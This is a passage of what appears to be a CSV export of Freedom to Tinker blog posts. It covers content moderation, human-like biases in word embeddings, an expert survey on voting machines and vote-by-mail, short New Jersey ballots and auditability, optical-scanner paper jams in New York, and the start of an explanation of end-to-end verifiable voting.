moderation? Is that an acceptable situation, even if we don’t know the rules that they are using to make those decisions? Who trains the algorithms, and with what data? Who gets access to the models and algorithms? How does disclosure work? How does a user learn that his or her content was taken down, as well as why it was taken down? What are the steps to remedy an incorrect, unlawful, or unjust takedown request? How can we trust the platforms to make the right decisions when in some cases it is in their financial interests to suppress speech? History has suggested that trusting the platforms to do the right thing in these situations can lead to restrictions on speech. Many of the above questions are regulatory. Yet, technologists can play a role for some aspects of these questions. For example, measurement tools might detect and evaluate removal and takedowns of content for some well-scoped forum or topic. A useful starting point for the design of such a measurement system could be a platform such as Politwoops, which monitors tweets that politicians have deleted. Summary The workshop was enlightening. I came as a technologist wanting to learn more about how computer science might be applied to the social and legal problems concerning content moderation; I came away with a few ideas, fueled by exciting discussion. The attendees were an healthy mix of computer scientists, regulators, practitioners, legal scholars, and human rights activists. I’ve worked on censorship of Internet protocols for many years, but in some sense measuring censorship can feel a little bit like looking for one’s key under the lamppost—my sense is that the real power over speech is now held by the platforms, and as a community we need new mechanisms—technical, legal, economic, and social—to hold them to account."
"441","2016-08-24","2023-03-24","https://freedom-to-tinker.com/2016/08/24/language-necessarily-contains-human-biases-and-so-will-machines-trained-on-language-corpora/","I have a new draft paper with Aylin Caliskan-Islam and Joanna Bryson titled Semantics derived automatically from language corpora necessarily contain human biases. We show empirically that natural language necessarily contains human biases, and the paradigm of training machine learning on language corpora means that AI will inevitably imbibe these biases as well. Specifically, we look at “word embeddings”, a state-of-the-art language representation used in machine learning. Each word is mapped to a point in a 300-dimensional vector space so that semantically similar words map to nearby points. We show that a wide variety of results from psychology on human bias can be replicated using nothing but these word embeddings. We primarily look at the Implicit Association Test (IAT), a widely used and accepted test of implicit bias. The IAT asks subjects to pair concepts together (e.g., white/black-sounding names with pleasant or unpleasant words) and measures reaction times as an indicator of bias. In place of reaction times, we use the semantic closeness between pairs of words. In short, we were able to replicate every single result that we tested, with high effect sizes and low p-values. These include innocuous, universal associations (flowers are associated with pleasantness and insects with unpleasantness), racial prejudice (European-American names are associated with pleasantness and African-American names with unpleasantness), and a variety of gender stereotypes (for example, career words are associated with male names and family words with female names). But we go further. We show that information about the real world is recoverable from word embeddings to a striking degree. The figure below shows that for 50 occupation words (doctor, engineer, …), we can accurately predict the percentage of U.S. workers in that occupation who are women using nothing but the semantic closeness of the occupation word to feminine words! These results simultaneously show that the biases in question are embedded in human language, and that word embeddings are picking up the biases. Our finding of pervasive, human-like bias in AI may be surprising, but we consider it inevitable. We mean “bias” in a morally neutral sense. Some biases are prejudices, which society deems unacceptable. Others are facts about the real world (such as gender gaps in occupations), even if they reflect historical injustices that we wish to mitigate. Yet others are perfectly innocuous. Algorithms don’t have a good way of telling these apart. If AI learns language sufficiently well, it will also learn cultural associations that are offensive, objectionable, or harmful. At a high level, bias is meaning. “Debiasing” these machine models, while intriguing and technically interesting, necessarily harms meaning. Instead, we suggest that mitigating prejudice should be a separate component of an AI system. Rather than altering AI’s representation of language, we should alter how or whether it acts on that knowledge, just as humans are able to learn not to act on our implicit biases. This requires a long-term research program that includes ethicists and domain experts, rather than formulating ethics as just another technical constraint in a learning system. Finally, our results have implications for human prejudice. Given how deeply bias is embedded in language, to what extent does the influence of language explain prejudiced behavior? And could transmission of language explain transmission of prejudices? These explanations are simplistic, but that is precisely our point: in the future, we should treat these as “null hypotheses’’ to be eliminated before we turn to more complex accounts of bias in humans."
"442","2018-11-20","2023-03-24","https://freedom-to-tinker.com/2018/11/20/expert-opinions-on-in-person-voting-machines-and-vote-by-mail/","In November 2018 I got opinions on voting machines and vote-by-mail from 17 experts on election verification, who have experience running/observing/studying elections in 17 states. On the acceptability of these in-the-polling-place voting technologies, in the context of U.S. elections: The consensus is that Direct Recording Electronic voting machines are unacceptable, even with a VVPAT (“voter verified paper audit trail visible to the voter under glass”). Most experts are lukewarm to hand-counted paper ballots, presumably because they’re impractical for large elections with many contests on the ballot. Most experts prefer hand-marked optical scan ballots, and all of these experts find hand-marked optical scan acceptable. Most experts are willing to accept ballot marking devices (BMDs) that prepare “bubble ballots” to be scanned by optical scan machines, but only 17% find this preferable to hand-marked optical-scan ballots. Opinion is mixed on BMDs that prepare bar-code ballots (with human-readable summaries) for tabulation by optical scanners, with most finding this technology at least “barely acceptable.” Almost no one prefers all-in-one machines that combine ballot marking and ballot scanning (but at least the voter can hold the ballot in her hand while inspecting it), with about a 50/50 split between “acceptable” and “barely acceptable”. Most experts don’t prefer ballot-marking devices (BMDs) for these reasons: If the paper jams, the power fails, or something else goes wrong with technology, voters using hand-marked paper ballots can still deposit their ballots in an emergency ballot for counting later; this is not an option with a BMD-only solution. BMDs are more susceptible to fraud: if a BMD wrongly marks a paper ballot, (studies have shown that) most voters won’t notice. BMDs cost $5000, pens cost 50c; it is expensive to supply enough BMDs for all voters, but it is feasible to supply BMDs sufficient for those voters unable to mark a paper ballot by hand. A few experts (17%) prefer BMD-marked ballots to hand-marked ballots because (1) there’s no chance of ambiguous marks and (2) it’s easier to give voters feedback about undervotes/overvotes. Regarding vote-by-mail: There is no consensus on whether vote-by-mail increases voter turnout. Almost all the experts agree that vote-by-mail seriously compromises the secret ballot, and that it still matters whether we have coercion-resistant secret balloting. Most experts are not confident that ballots are not interfered with between the time they leave the voters’ hands and the time they are counted, and are not confident the chain of custody for mail-in ballots could be made adequately secure. The experts agree that it is essential to have public observation of all the steps in handling mail-in ballots, but almost none of the experts believes that there is adequate public observation in their own jurisdictions.That is not to say that the experts are against vote-by-mail; it’s just that there are some issues that ought to be discussed and improved. DETAILS OF THE RESPONSES: In November 2018 I got expert opinions on voting machines and vote-by-mail from 17 experts on election verification, who have experience running/observing/studying elections in these states: AZ,CA,CO,CT,DC,FL,IA,IN,MD,MN,NJ,NM,NY,OR,PA,SC,VA. Referring to the bar-chart above on the acceptability of different polling-place voting technologies, 2 people prefer hand-counted paper ballots, 13 prefer hand-marked optically-scanned, 3 prefer BMD-marked optical-scan-bubble ballots, 3 prefer BMD-marked bar-code ballots with human-readable summary, 1 prefers all-in-one BMD/scanners. Considered barely acceptable or unacceptable are: hand-counted (9 people), BMD-marked bubble ballots (5), BMD-marked bar-codes (10), All-in-one (12), DRE+VVPAT (15), and paperless DRE (everybody). Comments on the choice of in-the-polling place voting machines: The paper ballots must be subject to a risk-limiting audit to be acceptable [Joe Hall] I want universally-usable, universally-verifiable, high-capacity voting systems that keep no state per-voter and that support single-ballot risk limiting audits with a minimal set of side channels CCOS preferred to PCOS; also need independent (not reliant on voting system) tally of the number of pieces of paper, to create a “ballot manifest” [Doug Jones] I downgrade all technologies where proofreading is required because proofreading, on paper or a screen, is something we know people are not good at. While I dislike bar codes, I grudgingly rank them equal to other BMDs because they leave hard evidence in the hands of any auditors when they print summaries that disagree with their bar codes. I downgraded the BMD/scanner combination because you said ‘can hold’ in a way that might lead to ‘license to cheat‘ logic. Having done a lot of recounts you have to have the ballot in your hands to determine the voter’s intent – nothing else works in a recount situation BMD are critical to eliminate voter intent errors due to misinterpretation of hand markings. [Luther Weeks] At least in my State if seems out of the question to recruit enough officials to hand count all ballots in polling places after every election, let alone recruit sufficient volunteer observers. Also election officials in our state argue that people cannot accurately count ballots by hand and claim to prove that in every post-election audit. We also suffer from very poor ballot security. So polling place optical scanning followed by sufficient audits would make it more difficult a statewide attack on our voting system to succeed. [Jeremy Epstein] BMD with bar codes would be OK if there’s audits that the bar codes match the selection (which is how I rated it), but would be barely acceptable otherwise. I have not studied the BMD options in any detail, so I base my responses mostly on what I read. I’m assuming that BMD in the BMD+scanner option is only there for people with disabilities. I base my response on that, though I don’t rule out the possible but unlikely situation in which a person without disabilities uses the BMD. I moved from PA to OR, and there’s lots to love about OR’s vote-by-mail. Hand-marked paper ballots, voters have lots of time and space to mark and review their ballots, etc. downsides include: easy coercion and invasion of privacy, e.g., of a victim of domestic abuse possible undetectable ballot tampering by insiders at the Board of Elections. One of the weakest security links is the custody of the ballots from casting to counting. From that point of view the ideal is precinct voting on paper, counted publicly at the precinct. After the counting of the ballots, the results are public and confirmable. Having served as a chief election judge (head pollworker) in MD since 2004, I have witnessed the long lines caused by having a limited number of voting stations. We had paperless DREs until 2016. Hand-marked paper ballots scanned by a scanner that notifies the voter if marks cannot be read correctly is the best solution because we can inexpensively add ballot-marking spaces to accommodate peak demand. This year we even had voters marking their ballots while standing in line waiting for a voting booth, using the folder we issue as a privacy sleeve to keep their ballots secret. When the scanner notifies a voter that their ballot could not be read, they can bring it to the chief judges to “spoil” it and be re-issued a new ballot. In the process they learn how to mark it correctly in the future. In many cases just filling in the bubble over top of their X or checkmark solved the problem. Any voters who have a hard time marking the ballot correctly by hand may always use the BMD to mark their ballot. There is no need for bar codes given the availability of OCR-friendly fonts and the limited set of valid inputs (we’re not trying to read journal articles here; we know exactly who is supposed to be on the ballot, so this is NOT the general OCR problem). Meanwhile, bar codes require either another layer of auditing (very few places have good audit regimes) or a dubious verification mechanism using vendor equipment, or voters to bring bar-code scanners to the polling place, which is bad because it will encourage people to take pictures of their ballots. Vendors pushing bar codes seem to be doing so based on the same key factor as last time when they were pushing DRE’s, namely their convenience. But since we’re buying voting machines instead of humidifiers, we should start with security and privacy goals and all “features” should be explicitly evaluated with respect to security and privacy (or else what the heck are we doing here?). A breakdown of the reasons for these opinions, regarding in-person voting: “(For nondisabled voters) Some form of BMD is preferable to hand-marked optical-scan because it avoids the problem of ambiguous marks” 4 strongly agree, 10 disagree or strongly disagree. “(For nondisabled voters) BMDs are preferable to hand-marked opscan ballots because then, disabled and conventionally abled voters are all using the same equipment” 4 strongly agree, 9 disagree or strongly disagree. (For nondisabled voters) Hand-marked opscan ballots are preferable to BMD-marked ballots because of the danger that the BMD will cheat or malfunction and the voter might not notice wrong marks” 5 strongly agree, 7 agree, 3 disagree or strongly disagree. “With precinct-count opscan of hand-marked ballots, the election administrator should configure the opscanner to notify the voter about overvotes/undervotes” 10 strongly agree, 4 agree, 2 disagree “BMDs are preferable to hand-marked paper ballots because it avoids the problem of preprinting opscan ballot forms” 3 strongly agree or agree, 10 disagree or strongly disagree “Answer the previous question, especially considering a scenario WITH vote centers” 1 strongly agree, 6 agree, 5 disagree, 3 strongly disagree “Answer the previous question, for a state without vote centers, every voter assigned to just one precinct” 3 strongly agree or agree, 12 disagree or strongly disagree “The cost and logistics of preprinted opscan ballots is just not a big deal” 9 agree or strongly agree, 4 disagree or strongly disagree “BMDs are preferable to ballot-on-demand printers because they can use cheaper, lighter-weight, less power-hungry technology” 3 agree, 6 disagree or strongly disagree “Hand-marked preprinted opscan ballots are preferable to ballot-on-demand or BMDs because they still work if all the technology fails in the polling place” 11 strongly agree, 4 agree, 1 disagree “In my experience running or observing elections, ballot-on-demand printers work well” 1 strongly agree, 2 agree, 1 disagree, 1 strongly disagree “Precinct-count opscan is preferable to central count because you get results as soon as the polls close, and before there are chain-of-custody issues with ballot boxes” 15 strongly agree or agree, 2 disagree “Central-count opscan is preferable to precinct-count because it’s cheaper and easier to manage” 3 agree, 11 disagree or strongly disagree “Central-count opscan is preferable to precinct-count because (at least with technology on the market now) it’s easier to do ballot-comparison audits” 1 strongly agree, 6 agree, 6 disagree or strongly disagree “Central-count opscan will likely be easier to audit than precinct-count for the foreseeable future” 4 agree or strongly agree, 7 disagree or strongly disagree “If a BMD or VVPAT were to change some of the voters’ selections on the printout, most voters would notice” 2 agree, 12 disagree or strongly disagree “If a voter notices that a BMD has wrongly marked the ballot, it’s clear to the voter what to do” 3 agree or strongly agree, 12 disagree or strongly disagree “If a voter believes that a BMD has wrongly marked a ballot, the pollworker usually knows what to do” 5 agree, 7 disagree or strongly disagree “A hacked BMD could get away with wrongly marking some votes on some ballots, because the worst that happens is that if detected, just those ballots will be remarked and the rest of the cheating survives” 6 strongly agree, 5 agree, 2 disagree Comments on the questions above: [Joe Hall] I don’t think scanners should notify voters on undervotes, but should on overvotes, so I disagreed there because you combined them. And your notion of a BMD seems to be one that prints the ballot? I think the question on BMD/VVPAT changing votes depends on the interaction design, but certainly research using available examples shows people only rarely check and correct. The rate of ambiguous marks is negligible; CCOS scanners are more cost effective and more accurate [Doug Jones] I have slowly come to the conclusion that the myth of ‘universal design’ is just that, a myth. ‘Accessible BMDs’ may be a single device that allows both disabled and able voters to vote, but the audio ballot is a different voting interface from the screen, and if you have to navigate with a sip and puff device, that’s a third interface. In reality, that BMD is really a bundle of 3 separate user interfaces, some of which might be well designed and some miserable. Bundling them into one mechanism is not necessarily appropriate. The two reasons for precinct-count (fast results and chain of custody) are of very different value. I value precinct-count because of its extremely strong chain of custody value. Posting results for the public at the precinct, sending the ballots and the electronic record and the printed record back to the county and modeming the electronic record. These separate copies of the record of what happened make it very hard for someone to alter the records in transit without being detected. I’ve done research on voters’ proofreading skills. A significant fraction of voters will not notice top-of-the-ballot alterations (I switched votes for McCain and Obama and 1/3 didn’t notice it), and mid-ballot changes are missed by most voters (a study at Rice found 2/3 missed random changes). Studies of VVPATs in Nevada showed similar rates of proofreading. Furthermore, in my study, when voters did notice switching of McCain and Obama, they blamed themselves for making the mistake and did not blame the voting machine. You did not specify if the central count option was due to a vote by mail administration or for some other reason. If it is an all vote by mail jurisdiction then of course you have to have a central count and the question makes no sense to me. If you do not have a vote by mail jurisdiction then there is no good reason to gather up ballots in precincts and ship them off somewhere. I don’t really understand what the question means?? This survey does not have an option “I do not know” so that is a huge problem for me – never having any actual experience to make a judgement from. Also, once you click on a circle this survery does not allow for unclicking – a huge problem for me and I do not want any of my responses to the last question to be included – I happened to click on it by mistake and discovered this flaw in the process [Dan McCrea] PCOS scanners should notify of overvotes only – not undervotes (too much time/noise); BMDs for non-disabled voters is a vendor’s pipe dream and entirely unnecessary. ($4,000 BMD vs. $5 pen + accrued portion of booth); I object fundamentally to playing CCOS off PCOS because of audits – It’s a flawed problem because where people want to conduct effective audits, both can be made to work acceptably well. Vendors will quickly develop compliant devices if federal guidelines & state standards require precinct-count ballot-comparison audits compatibility. Precinct scanned opt-scan is much preferable to central scanning because it gives the voter the chance to correct over and under votes, and removes an opportunity for fraud during transport. Our state does not use vote centers (except with early absentee voting), so usually ballot on demand is not a big deal – but there are times and places where it would be very useful if state law allowed. I’m concerned about the opportunity for fraud with ballot on demand printing – there would have to be very strict procedures to track ballots printed. We reduced lines by moving from DRE to opt-scan since many voters can mark paper ballots in parallel. Pushing BMDs for most voters would add cost and lines when most voters could just use an inexpensive pen to mark a ballot. [Jeremy Epstein] The answers depend on whether cost is a consideration – I’d love to have enough BMDs that no one has to wait for one, but that’s ridiculously expensive. In my small precinct (1800 voters) I’d need 8-10 of them, and it’s only that small a number because Virginia usually has very short ballots. Similarly, the answers on BMD marked depend on whether there’s an assumption that audits take place. For notification of under/overvotes, those two are quite different – definitely yes for overvotes, but the scanner will constantly alert on undervotes especially in places with long ballots. (In our most complex elections in Virginia, which are short compared to other states, we probably have 30% undervote on downballot items, which would paralyze the polling place if they all alerted.) [Paul Stokes] Re: Central-count opscan will likely be easier to audit than precinct-count for the foreseeable future; my answer (Disagree) is based on having done statistical, evidence-based audits since 2010, based on comparing hand-counted and machine counted precinct tallies. We don’t find the hand-counting of the precinct results difficult. The overall logistics for hand-counting precinct results don’t seem to me to require a lot more resources that single ballot auditing at central locations when you factor in the reasonable assumptions that can be made for precinct-based auditing that reduce the number in the sample by something like a factor of four. And auditing precinct results has the functional advantage of verifying the vote tallies as well as the ballot content. BMDs are too expensive to buy, store, and maintain to make it practical to have enough equipment to meet peak demand, thereby causing long wait times. Voting systems should be easily expandable to accommodate peak demand without causing voters to have long waits to vote. Most counties cannot easily afford to spend huge sums on equipment that gets such limited usage and will be obsolete in just a few election cycles. Under/overvote warning – – yes for over votes, yes for blank pages, yes for 3-4 top of the ticket contests, no for other contests. Voters may notice changes more on BMDs than VVPATS. Studies should be to answer analyze this. Vote centers are an availability menace if they require real-time network connectivity to prevent one voter from voting in two vote centers. At least in PA, polling places are required to have a reasonable quantity of pre-printed “emergency ballots”, so anybody talking about how expensive it is to pre-print paper ballots for each polling place instead of “just” sending lots of BMDs should be making a comparison including this baseline paper cost. I can imagine a sensible saving-paper architecture based on “printing centers” in a few places in a county that can demand-print ballots for polling places that run low. That way if one on-demand printer breaks nobody is in trouble, which is not the case if each polling place has a cheap printer. Opinions regarding mail-in ballots “By-mail voting improves voter turnout” no consensus “By-mail voting seriously compromises the secret ballot” 15 strongly agree or agree, 1 disagree “It still matters a lot whether we have coercion-resistant secret balloting” ALL strongly agree or agree “I am confident that ballots are not interfered with between the time they leave the voters’ hands and the time they are counted” 3 strongly agree or agree, 10 disagree or strongly disagree “Chain-of-custody issues for mail-in ballots are different, but not inherently worse than, chain-of-custody for in-precinct ballot boxes” 5 strongly agree or agree, 11 disagree or strongly disagree “(Whether or not I’m confident now), security of mail-in ballots on their way to being counted _could_ be made adequately secure” 2 agree, 9 disagree or strongly disagree “Public observation of _all_ the steps in handling a mail-in ballot, is essential” 14 strongly agree or agree, 1 disagree “Public observation of those steps is actually done in a jurisdiction I’m familiar with” 1 strongly agree, 9 disagree or strongly disagree Comments on the questions above: Mail out, return in dropbox is better than mail out, mail back For those of us where there is a mix of precincts and mail-in there are many different ways to answer these – I need that “it depends” option [Dan McCrea] Public observation of all the steps in elections requires not just accommodating regulation but a motivated public to do the observing. The latter tends to be sporadic, partly dependent on controversy, often absent. I don’t see how there can be public observation of all steps in handling a mail-in ballot. For example, we can’t observe inside the post office continuously during the mail-in period. Voting by mail tends to disenfranchise an already vulnerable population: those without a stable address, who tend to be young or elderly, poor, and non-white. Vote centers do not always make it easy to vote because they are fewer and may be farther away than a neighborhood polling place, requiring long rides and multiple transfers on public transportation. There are many ways to fail at voting by mail, including not signing oaths, not returning the ballot on time, over- or under-voting, not receiving a ballot or receiving the wrong ballot style, ballots stolen from apartment mailrooms, etc. It is very difficult to reliably authenticate remote voters, and fraud is more easily possible. Vote-buying/selling is also much more easily accomplished. The cost and loginstics of preprinting ballots should not be a big deal, but we see again and again, like in this election in Maryland, that it can be paramount. I would be interested in credible academic studies showing that vote-by-mail permanently improves turnout, as opposed to arguably providing a brief spike. Several years ago I looked for studies and what I saw sure looked like “brief novelty spike”. Other comments: Disenfranchisement is a bigger issue than invalid ballots as of now. Literally *every* time I have talked to an immigrant (to PA) from a vote-by-mail state, I ask “How do you know that your ballot is received when you mail it?” and *every* time I am told “Oh, there is some way to check” [telephone or online], and *every* time I ask “Have you ever checked?” the answer is no. But the hypothetical safety of vote-by-mail is predicated on a *high* rate of people checking–again and again, in every election. So I think it would be interesting if vote-by-mail jurisdictions would publicly announce how many people checked whether their ballots arrived–interesting, but only in a “yeah, fat chance!” kind of way. And here we are discussing mere *arrival*, not tampering. The respondents were, Andrew W. Appel, Professor of Computer Science, Princeton University Alex Blakemore, Vice President, Apogee Integration Duncan Buell, Professor of Computer Science and Engineering, University of South Carolina David A. Eckhardt, Teaching Professor of Computer Science, Carnegie Mellon University; Judge of Elections (appointed) Jeremy Epstein, Deputy Division Director, National Science Foundation Lynn Garland, unaffiliated Joseph Lorenzo Hall, Chief Technologist, Center for Democracy and Technology Douglas W. Jones, Associate Professor of Computer Science, University of Iowa Dan McCrea, President, Florida Voters Foundation Mark Ritchie, former Minnesota Secretary of State Stephanie Singer, Consultant, Verified Voting; former Chair, Philadelphia County Board of Elections Eugene Spafford, Professor of Computer Science, Purdue University Philip B. Stark, Professor of Statistics, University of California, Berkeley Paul Stokes, Progressive Democrats of America / Central New Mexico Maurice Turner, Senior Technologist, Center for Democracy and Technology Luther Weeks, Executive Director, Connecticut Voters Count Rebecca Wilson, Co-director, Save our Votes (Maryland)"
"443","2018-11-12","2023-03-24","https://freedom-to-tinker.com/2018/11/12/two-cheers-for-limited-democracy-in-new-jersey/","When I voted last week in Princeton, New Jersey, here were the choices I faced, all on one “page”: I had to vote in 7 contests, total: for Senator, Congress(wo)man, County board, County board unexpired term, City council, Statewide referendum, School board. Put another way, I had to select 13 choices out of 27 options (not counting write-in options). The ballot is so short because: New Jersey elects its governor and legislature in odd-numbered years, does not have initiative-and-referendum by petition, does not elect judges. In contrast, a voter in Los Angeles was given a 76-page packet, in which the 9-page ballot contained optical-scan bubbles to fill in. The voter had to select 55 choices out of 229 options. The founders of our democracy designed a Constitution in which (at the Federal level) voters elect representatives and executives who pass legislation, nominate and confirm judges, and so on. That is, we have limited democracy, in the sense that it is representative. But some States, especially California, ask voters to decide legislative questions (“propositions”) and elect judges. Political scientists and informed citizens debate whether that’s a good idea. Here I’ll consider a particular aspect of that constitutional difference: Auditability of elections. It is a clear scientific consensus, and it is becoming a consensus among the citizenry and the States, that we should vote with paper ballots that are recountable by human inspection, and we should have random audits by human inspection of (a random sample of) those paper ballots, just to make sure the voting machines are not malfunctioning or cheating. Random audits take time, effort, and money–not an enormous cost, but not trivial either. The cost and difficulty of risk-limiting audits surely increases as the number of contests on the ballot increases. Auditing New Jersey’s 7 contests (more or less, in different towns) will not be very difficult. Auditing Los Angeles’s 52 contests will be quite a chore. Surely that’s one argument for keeping the ballot short. In practice, risk-limiting audits of California elections are likely to be done in such a way that Federal, statewide, and countywide contests are checked to a specified risk limit (perhaps 5%), but on all ballots examined, all contests are audited. That will audit many more contests to a risk limit that is not predetermined, and may or may not be small, but will at least be reported as a result of the audit. In that manner, even LA’s long ballot can be audited. Why only “two cheers” for New Jersey? Well, in New Jersey we have “limited democracy” in a different form as well: we use paperless direct-recording electronic (DRE) voting machines. The computers in those machine get to decide what to report about the buttons we pressed, and there are no paper ballots to recount. We have delegated our representation to whomever was the last to install a computer program in those machines, whether legimitately or illegitimately. Surely that’s not what the founders intended by “representative democracy.”"
"444","2018-11-09","2023-03-24","https://freedom-to-tinker.com/2018/11/09/when-the-optical-scanners-jam-up-what-then/","In the November 2018 election, many optical-scan voting machines in New York experienced problems with paper jams, caused by the rainy weather and excessive humidity. Also, this was the first time New York used a 2-page ballot that the voter had to separate at the perforations. This doubled the number of sheets of paper that the optical scanners had to process. These two factors caused long lines, and voter frustration, at some polling places. At some polling places, there were not adequate “emergency ballot boxes” for deposit of not-yet-scanned paper ballots. New York, like many other states, uses a robust, trustworthy, and reliable means of balloting: optical-scan paper ballots, hand-marked by the voters (except for those voters who choose to use a ballot-marking device), which the voter deposits directly into an optical scanner. That is, “precinct-count optical scan” (PCOS). No voting method is perfect, but PCOS is less imperfect than other methods. Here are some important principles of precinct-count optical scan: Feedback: if the voter inadvertently overvotes the ballot (marks too many bubbles in the same contest), the scanner can alert the voter to this problem, giving the voter the chance to correct it by filling in a fresh ballot. Immediate count: vote totals are reported as soon as the polls close. Unofficial (but informative) precinct totals can be reported immediately to the county, to the news media, and to members of the public present at the polling place. Also, there’s at least one count of the votes before any transportation or handling of ballot boxes. The paper ballots are legally the ballot of record for recounts, with random audits of paper ballots necessary to detect and deter cheating via hacking of optical scanner software. But if there is interference with the paper ballots in the chain of custody between the precinct and the audit or recount, the in-the-precinct totals are at least evidence that an investigator or court of law might find useful. Robustness: if the power fails, or the optical scanner fails for some other reason, voters can still hand-mark their optical-scan ballots, and deposit them into a ballot box for later counting. You might notice that “deposit into a ballot box for later counting“ conflicts with ”feedback” and “immediate count.” What should we do about that? I have consulted with several experts in election verification, and here are the consensus recommendations: If the optical scanner fails for some reason, and cannot immediately be put back into operation, then pollworkers should promptly switch to the mode of depositing ballots in ballot boxes to be counted later. This will minimize the chance of long lines at the polling places, and therefore will minimize the number of voters who are discouraged from voting by long lines. Election administrators should make sure every polling place is equipped with the appropriate ballot boxes for deposit of central-count ballots, if high-capacity bins are not already built into the PCOS itself. For the duration of the outage, voters will lose the advantage of overvote detection/correction. Compared to disenfranchising voters by making stand in line for hours until the voting machines are fixed, this is the lesser of two evils–especially since overvotes are quite rare anyway (and all those voters that use mail-in ballots don’t get feedback either about their overvotes). Still, I believe these recommendations are consistent with New York’s policies, and I believe that polling places in New York followed these procedures. And yet there were news articles about the problem. What went wrong, and what could be improved? Training. Professor Charles Stewart (MIT) writes, “The problem I saw reported was what happened when precincts transitioned to putting the ballots in the “emergency” ballot box. Many poll workers weren’t confident about what to do. They were frazzled. That was picked up by the voters, who reacted suspiciously. … So, it seems to me that the real issue was not the procedure, but the training around the procedure. We all know that you learn emergency procedures through drill, drill, drill, and I suspect that poll worker training will never be long enough to do a good job of making all poll workers confident enough to just slide into emergency mode and pull it off without a hitch.” Early voting as a form of pollworker training. Jennifer Morrell (election consultant and former Colorado election official) writes, “The poll worker training we conducted in Arapahoe County, Colorado was almost 40 hours for the supervisor of each polling location and slightly less for the other poll workers. … One entire day was spent in a mock election ‘lab’ where the poll workers were faced with the worst case scenarios my team could concoct. Practicing is everything! … All of this is feasible because of the 400,000+ registered voters in that county, less than 10% opted to vote in person at one of 26 voter service and polling centers. Staffing, equipping, and adequately training poll workers can be done successfully when you can focus on just a few dozen locations versus hundreds of locations. Those same poll workers then have almost 2 weeks of early voting where turnout is light to practice, work out any kinks, make sure all the equipment is there and functioning properly, etc. … The election model really does make a difference.” Precinct count without (immediate) optical scan. Professor Doug Jones (U. of Iowa) writes, “At least in Iowa, the precinct workers … count the contents of the emergency ballot bin immediately after the polls close, either by inserting the ballots in the scanner (assuming it has been made operational after a temporary failure) or by hand counting them. As a result, the totals reported from the precinct always include all non-provisional ballots cast at that precinct. During the count of ballots from the emergency ballot box (and also, during the central count of absentee ballots), the scanner is always set to sort out and not count ballots that scan as blank or contain overvotes. These ballots are always subject to human interpretation, since most overvoted ballots and many apparently blank ballots contain clear indications of voter intent.” (Indeed, New York’s procedures are similar; see state statute 9-110. Canvass; election day paper ballots that have not been scanned; method of.) Quality of the paper. Jennifer Morrell writes, “Paper thickness, weight, and humidity are critically important! So is the type of ink used [by ballot-on-demand printers] to print the ballots and knowing if there is any type of coating or finishing spray used. Sticking to the same paper manufacturer throughout the print run makes a difference. So does the way the paper is cut – blade vs laser cut. Also, scanners have to be cleaned on a regular basis (after so many pieces of paper scanned).” So therefore, choose your printing company after a thorough RFI/RFP process to make sure they have knowledge and expertise with ballots. Such a company will make sure to use paper that satisfies the specs provided by the voting-machine vendor, and use the same paper for the entire print run. (But as others have pointed out, don’t fall into the trap of sole-sourcing your paper and paying too much.) What if only some of the machines are working? The experience in New York raises this question: What if at least some scanners are operational in the precinct, but the lines at the scanner are very long anyway? (This might be because there are just too many sheets of paper to be scanned, as a product of voter turnout and ballot length.) If the lines at the scanner are long, then the pollworkers at the check-in station (pollbooks) are probably holding voters back because there’s not place for them to mark their ballots, and so on. This suggests that a reasonable policy might be, If the optical scanners cannot handle the volume of ballots for any reason, then pollworkers should promptly switch to the mode of depositing ballots in ballot boxes to be counted later. I’ll be that is not the current policy in New York, or Iowa! Experience is a great teacher. New York’s 2010 transition from lever machines to optical scanners was carefully planned, and overall the scanners worked well between 2010 and 2016. This year’s problem with paper jams may have surprised New York’s election administrators, but I’m willing to bet that the next time it rains on election day, they’ll make things go more smoothly."
"445","2018-11-05","2023-03-24","https://freedom-to-tinker.com/2018/11/05/end-to-end-verifiable-elections/","As of 2018, the clear scientific consensus is that Elections should be conducted with human-readable paper ballots. These may be marked by hand or by machine (using a ballot-marking device); they may be counted by hand or by machine (using an optical scanner). Recounts and audits should be conducted by human inspection of the human-readable portion of the paper ballots. … States should mandate risk-limiting audits [of a statistically valid random sample of the ballots] prior to the certification of election results. With current technology, this requires the use of paper ballots. Even so, no technology, no methods of election administration, will perfectly assure the accuracy of our elections. Risk-limiting audits of paper ballots are the best method we know, but as I’ve reminded you recently, fraud can be perpetrated on paper ballots, too. End-to-end verifiable voting is a quite different way to audit whether election results follow the voters’ choices, in a way that does not require trust in the chain of custody of paper ballots. E2E-V methods were developed by several computer scientists over the past 35 years or so. E2E-V allows the voter to trace an individual ballot through the system to make sure it was counted correctly, and allows anyone to see that those ballots were added up correctly. Much of the technical wizardry of E2E-V is devoted to doing that without compromising the secret ballot. The secret ballot–to protect the voter from being coerced to vote a certain way–was introduced in the late 19th century in response to severe coercion of voters (by employers, by local political machines) and vote buying. It’s important that no one should be able to learn how a voter voted, even with her consent (else she can be coerced or bribed). (Of course, it’s fine to say, “I proudly voted for Candidate X”, but you must not be able to prove it.) To explain E2E-V, first let’s pretend that we don’t need secret ballots, that every vote is public. Then it’s easy. The voter signs her ballot, sends it in, and all ballots are posted in a public, electronic bulletin board–each ballot identified with the name of the voter. Any voter can check that board, to make sure her vote is listed correctly. Any member of the public can check that board, to make sure all the votes are added up correctly. We don’t have to worry about the chain of custody, how the votes were transported and handled on the way to being posted on the public bulletin board. (We do have to ensure that everyone sees a consistent view of the bulletin board–there are plenty of details to worry about.) But of course, we need the secret ballot, so real E2E-V systems use cryptographic protocols to probabilistically guarantee that votes are accurately posted on the board, without any individual voter able to prove how she voted. One modern E2E-V system (StarVote) works like this: At the polling place, the voter uses a voting terminal (touchscreen or other accessible computerized device) to prepare two pieces of paper: the ballot and the receipt. The ballot lists a human-readable summary of the voter’s choices, and a random (nonsequential) serial number; The receipt contains a 20-character code that commits to the voter’s choices and serial number. In addition, the voting terminal encrypts the ballot, and stores the encrypted ballot in its memory, linked to the serial number and the code. What does that mean, “commits”? The computer has applied a one-way function to the encrypted contents of the ballot, to compute the code. It’s not possible to calculate the ballot-contents from the code, but it is possible for the voting terminal to prove that the code summarizes the ballot-contents. Now the voter has a choice: Deposit the ballot into the ballot box and take home the receipt; or, Make the voting terminal prove it wasn’t cheating, that the code correctly summarizes the ballot; and void (“spoil”) this ballot, and start the process from the beginning, casting a new vote (and still take home the receipt). I’ll explain this choice below. For now, suppose the voter chooses (1), cast the ballot and take home the receipt. When the polls close, all the encrypted ballots are published, along with all the serial numbers in the ballot box. Using sophisticated cryptographic techniques (e.g., “homomorphic encryption”), it’s possible to add up the votes (just those that correspond to serial numbers of cast 